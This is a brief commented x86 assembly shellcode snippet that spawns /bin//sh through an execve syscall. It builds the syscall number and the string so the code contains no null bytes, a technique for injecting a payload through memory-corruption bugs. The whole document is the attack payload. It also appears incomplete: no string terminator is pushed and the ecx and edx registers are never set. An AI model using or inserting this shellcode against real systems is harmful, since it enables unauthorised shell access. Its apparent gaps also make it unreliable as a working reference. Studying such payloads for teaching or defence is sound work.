
shellcode:
    xor eax, eax      ; set eax to 0xb (execve syscall) 
    add al, 0x05      ; eax := eax + 5
    add al, 0x06      ; eax := eax + 6 (directly setting al to 0xb won't work)
    push 0x68732f2f   ; put /bin//sh on the stack, 
    push 0x6e69622f   ; (double// avoids having a 0x00 in the code) 
    mov ebx, esp      ; ebx := &"/bin//sh"
    int 0x80          ; syscall
